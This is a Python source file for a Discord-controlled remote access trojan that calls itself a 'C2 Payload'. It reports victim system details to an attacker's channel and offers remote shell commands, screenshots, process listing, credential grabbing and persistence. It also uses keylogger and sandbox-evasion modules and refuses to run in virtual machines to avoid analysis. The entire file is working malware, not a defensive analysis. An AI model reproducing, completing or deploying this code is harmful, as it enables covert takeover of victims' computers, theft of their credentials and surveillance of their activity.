import discord
from discord.ext import commands
from discord import app_commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture, imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
import argparse
import asyncio
import logging
from multiprocessing import Process
import threading
import json
import ctypes
import time
import psutil
from libraries import credentials, keylogger, sandboxevasion, disctopia

# Configuration placeholders - will be replaced by build script
GUILD_ID = "{GUILD_ID}"
BOT_TOKEN = "{BOT_TOKEN}"
CHANNEL_ID = {CHANNEL_ID}
KEYLOGGER_WEBHOOK = "{KEYLOGGER_WEBHOOK}"

GUILD = discord.Object(id=GUILD_ID)
CURRENT_AGENT = 0

# Global debug mode flag
DEBUG_MODE = False

def setup_logging():
    """Setup logging for debug mode"""
    if DEBUG_MODE:
        logging.basicConfig(
            level=logging.DEBUG,
            format='[%(asctime)s] %(levelname)s: %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout),
                logging.FileHandler('debug.log')
            ]
        )
        # Enable discord.py debug logging
        discord_logger = logging.getLogger('discord')
        discord_logger.setLevel(logging.DEBUG)

        print("=" * 60)
        print("DEBUG MODE ENABLED")
        print("=" * 60)
        print(f"Bot Token: {BOT_TOKEN[:20]}...")
        print(f"Guild ID: {GUILD_ID}")
        print(f"Channel ID: {CHANNEL_ID}")
        print(f"Webhook: {KEYLOGGER_WEBHOOK[:50]}...")
        print("=" * 60)

def debug_log(message):
    """Log debug messages"""
    if DEBUG_MODE:
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] DEBUG: {message}")
        logging.debug(message)

async def send_debug_hit():
    """Send debug hit to Discord server"""
    if not DEBUG_MODE:
        return

    try:
        debug_log("Sending debug hit to Discord server...")

        # Create a simple bot instance for debug hit
        intents = discord.Intents.default()
        debug_bot = discord.Client(intents=intents)

        @debug_bot.event
        async def on_ready():
            debug_log(f"Debug bot connected as {debug_bot.user}")

            try:
                channel = debug_bot.get_channel(int(CHANNEL_ID))
                if channel:
                    embed = discord.Embed(
                        title="🐛 DEBUG HIT - Payload Test",
                        description="Debug mode payload executed successfully",
                        color=0xFF9900,
                        timestamp=datetime.now()
                    )

                    # System information
                    embed.add_field(name="🖥️ System", value=disctopia.getOS(), inline=True)
                    embed.add_field(name="👤 User", value=disctopia.getUsername(), inline=True)
                    embed.add_field(name="🌐 IP", value=disctopia.getIP(), inline=True)
                    embed.add_field(name="💻 Hostname", value=disctopia.getHostname(), inline=True)
                    embed.add_field(name="⚙️ CPU", value=disctopia.getCPU()[:50], inline=True)
                    embed.add_field(name="🔧 Bits", value=disctopia.getBits(), inline=True)

                    # Debug information
                    embed.add_field(name="🔍 Debug Mode", value="✅ Active", inline=True)
                    embed.add_field(name="🛡️ Admin", value=disctopia.isAdmin(), inline=True)
                    embed.add_field(name="🖥️ VM Check", value=disctopia.isVM(), inline=True)

                    # Sandbox evasion status
                    evasion_status = "✅ Passed" if sandboxevasion.test() else "❌ Failed"
                    embed.add_field(name="🛡️ Evasion", value=evasion_status, inline=True)

                    embed.set_footer(text="Debug payload test - Functional verification")

                    await channel.send(embed=embed)
                    debug_log("Debug hit sent successfully!")

                else:
                    debug_log(f"Channel {CHANNEL_ID} not found!")

            except Exception as e:
                debug_log(f"Error sending debug hit: {e}")

            await debug_bot.close()

        await debug_bot.start(BOT_TOKEN)

    except Exception as e:
        debug_log(f"Failed to send debug hit: {e}")

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='Discord C2 Payload')
    parser.add_argument('-d', '--debug', action='store_true',
                       help='Enable debug mode with terminal logs and Discord hit')

    try:
        args = parser.parse_args()
        return args
    except:
        # If parsing fails (e.g., in compiled exe), return default
        return argparse.Namespace(debug=False)

class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)
        debug_log("Bot instance created")

    async def on_ready(self):
        debug_log(f"Bot connected as {self.user}")
        await self.wait_until_ready()

        self.channel = self.get_channel(CHANNEL_ID)
        debug_log(f"Channel obtained: {self.channel}")

        now = datetime.now()

        config = disctopia.createConfig()
        agent_id = disctopia.id()
        debug_log(f"Agent ID: {agent_id}, Config created: {config}")

        if config:
            msg = f"New Agent Online #{agent_id}"
            color = 0x00ff00
        else:
            msg = f"Agent Online #{agent_id}"
            color = 0x0000FF

        my_embed = discord.Embed(title=msg, description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=color)
        my_embed.add_field(name="**IP**", value=disctopia.getIP(), inline=True)
        my_embed.add_field(name="**Bits**", value=disctopia.getBits(), inline=True)
        my_embed.add_field(name="**HostName**", value=disctopia.getHostname(), inline=True)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        my_embed.add_field(name="**CPU**", value=disctopia.getCPU(), inline=False)
        my_embed.add_field(name="**Is Admin**", value=disctopia.isAdmin(), inline=True)
        my_embed.add_field(name="**Is VM**", value=disctopia.isVM(), inline=True)
        my_embed.add_field(name="**Auto Keylogger**", value=False, inline=True)

        if DEBUG_MODE:
            my_embed.add_field(name="**Debug Mode**", value="🐛 ACTIVE", inline=True)

        await self.channel.send(embed=my_embed)
        debug_log("Agent online message sent")

    async def setup_hook(self):
        debug_log("Setting up command tree...")
        await self.tree.sync(guild=GUILD)
        debug_log("Command tree synced")

    async def on_command_error(self, ctx, error):
        debug_log(f"Command error: {error}")
        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

    async def on_command(self, ctx):
        debug_log(f"Command executed: {ctx.command} by {ctx.author}")

    async def on_message(self, message):
        debug_log(f"Message received: {message.content[:50]}... from {message.author}")
        await self.process_commands(message)

class InteractButton(discord.ui.View):
    def __init__(self, inv: str, id: int):
        super().__init__()
        self.inv = inv
        self.id = id

    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple, emoji="🔗")
    async def interactButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        await interaction.response.send_message(embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00), ephemeral=True)

    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.gray, emoji="❌")
    async def terminateButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
        await interaction.response.send_message(embed=my_embed)
        await bot.close()
        sys.exit()

    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="🖼️")
    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.screenshot()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="Process", style=discord.ButtonStyle.gray, emoji="📊")
    async def process(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.process()
        if len(result) > 4000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file=discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"```\n{result}\n```")

    @discord.ui.button(label="Creds", style=discord.ButtonStyle.gray, emoji="🔑")
    async def creds(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.creds()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

bot = Bot()

@bot.hybrid_command(name="interact", with_app_command=True, description="Interact with an agent")
@app_commands.guilds(GUILD)
async def interact_cmd(ctx: commands.Context, id: int):
    global CURRENT_AGENT
    CURRENT_AGENT = id
    my_embed = discord.Embed(title=f"Interacting with Agent#{id}", color=0x00FF00)
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="cmd", with_app_command=True, description="Run any command on the target machine")
@app_commands.guilds(GUILD)
async def cmd_command(ctx: commands.Context, command: str):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        result = disctopia.cmd(command)
        if len(result) > 2000:
            path = os.environ["temp"] + "\\response.txt"
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply("```" + result + "```")

@bot.hybrid_command(name="screenshot", with_app_command=True, description="Take a screenshot of the target machine's screen")
@app_commands.guilds(GUILD)
async def screenshot_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        result = disctopia.screenshot()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{agent_id}", color=0xFF0000)
            await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="ls", with_app_command=True, description="List all the current online agents")
@app_commands.guilds(GUILD)
async def ls_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if ctx.interaction:
        my_embed = discord.Embed(title=f"Please use **!ls** instead of the slash command", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    else:
        my_embed = discord.Embed(title=f"Agent #{agent_id}   IP: {disctopia.getIP()}", color=0xADD8E6)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        view = InteractButton("Interact", agent_id)
        await ctx.reply(embed=my_embed, view=view)

@bot.hybrid_command(name="persistent", with_app_command=True, description="Make the agent persistent on the target machine")
@app_commands.guilds(GUILD)
async def persistent_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        result = disctopia.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistence enabled on Agent#{agent_id}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while enabling persistence on Agent#{agent_id}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="terminate", with_app_command=True, description="Terminate the agent")
@app_commands.guilds(GUILD)
async def terminate_cmd(ctx: commands.Context):
    agent_id = disctopia.id()
    if int(CURRENT_AGENT) == int(agent_id):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{agent_id}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
        await bot.close()
        sys.exit()

async def main():
    """Main execution function"""
    global DEBUG_MODE

    # Parse command line arguments
    args = parse_arguments()
    DEBUG_MODE = args.debug

    # Setup logging if debug mode
    setup_logging()

    if DEBUG_MODE:
        debug_log("Starting payload in DEBUG MODE")
        debug_log("Performing system checks...")

        # Send debug hit first
        await send_debug_hit()

        # Show evasion test results
        evasion_result = sandboxevasion.test()
        vm_result = disctopia.isVM()

        debug_log(f"Sandbox evasion test: {'PASSED' if evasion_result else 'FAILED'}")
        debug_log(f"VM detection test: {'VM DETECTED' if vm_result else 'PHYSICAL MACHINE'}")

        if not evasion_result:
            debug_log("WARNING: Sandbox evasion failed - payload may be in analysis environment")

        if vm_result:
            debug_log("WARNING: VM detected - payload may be in virtualized environment")

        debug_log("Starting Discord bot...")

        # In debug mode, always run regardless of evasion
        try:
            await bot.start(BOT_TOKEN)
        except Exception as e:
            debug_log(f"Bot failed to start: {e}")
            input("Press Enter to exit...")
    else:
        # Normal operation - run evasion checks
        if sandboxevasion.test() == True and disctopia.isVM() == False:
            bot.run(BOT_TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        if DEBUG_MODE:
            debug_log("Payload interrupted by user")
        sys.exit(0)
    except Exception as e:
        if DEBUG_MODE:
            debug_log(f"Payload crashed: {e}")
        sys.exit(1)
